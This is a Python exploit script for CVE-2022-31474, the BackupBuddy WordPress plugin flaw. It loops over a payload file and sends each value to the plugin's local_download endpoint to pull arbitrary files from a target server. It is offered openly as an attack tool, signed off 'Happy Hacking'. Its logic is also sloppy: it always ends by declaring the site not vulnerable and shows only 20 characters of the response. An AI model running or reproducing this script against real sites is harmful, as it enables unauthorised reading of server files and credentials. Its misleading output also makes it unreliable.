# Exploit for CVE-2022-31474

import argparse
import sys
import time
from urllib3 import disable_warnings
import requests
from colorama import Fore
import os
from pyfiglet import figlet_format

# Disable Connection cirumstances 

disable_warnings()

# clear terminal 

os.system('cls || clear')

# Introduction   

print(Fore.RED + figlet_format("-------"))
print(Fore.RED + figlet_format("HAEXer"))
print(Fore.RED + "Vulnerablilty:- 0-day WordPress BackupBuddy plugin\nCVE: CVE-2022-31474")
print(Fore.RED + "Author: Aniket Tyagi")
print(Fore.RED + figlet_format("-------"))

# Argument check 

if len(sys.argv) > 1:
    pass
else:
    print(Fore.MAGENTA + '\n%s Please use -h for help.' % (sys.argv[0]))
    exit(0)
    
# Argument Assigning    

parser = argparse.ArgumentParser()
parser.add_argument('-U', '--Url', help='Provide Subdomain-list')
parser.add_argument('-P', '--payload', help='Provide header-list default: headers.txt', default='payload.txt')
parser.add_argument('-t', '--timeout',
                    help='Maximum number of seconds to wait where requesting a web page (Default: 7)', default=10,
                    type=int)

argu = parser.parse_args()
url = argu.Url
p1 = argu.payload
Timeout = argu.timeout

print(Fore.RED + "Exploit Starting.....\n")
time.sleep(2)


# Function to retrive user supplied file 

def payi(file):
    file_a = open(file, "r")
    p2: list[str] = []
    [p2.append(http_head.strip()) for http_head in file_a]
    return p2


Payload = payi(p1)

# Main Program

for paylaod_buster in Payload:

    request = requests.get(
        url + "/wp-admin/admin-post.php?page=pb_backupbuddy_destination&local-destination-id=" + paylaod_buster + "&local_download=" + paylaod_buster)

    if request.status_code == 200:

        print(
            "\nApplication reply back with 200 Status Code, but it might be false ,So if you want to see some sort of line of response then please give me command for do this")

        user = input("Are you want to see the response? Yes/No")

        if user == 'Yes':

            print(Fore.RED + "---------------------")
            print(request.text[0:20:])
            print(Fore.RED + "---------------------")

        else:
            pass

    elif request.status_code == 403:

        print("\nApplication give me Forbidden Status Code, Therefore To bypass this You can use Ms.Robot")

    else:
        print("[[Can't Work]]")

# Ending .....
        
print("\nSorry! Application is not vulnerable to CVE-2022-31474")
print("Try me on some other application")

print("\n\t\t---------------------------------------")
print("\n\t\t\t     Happy Hacking                   ")
print("\n\t\t---------------------------------------")
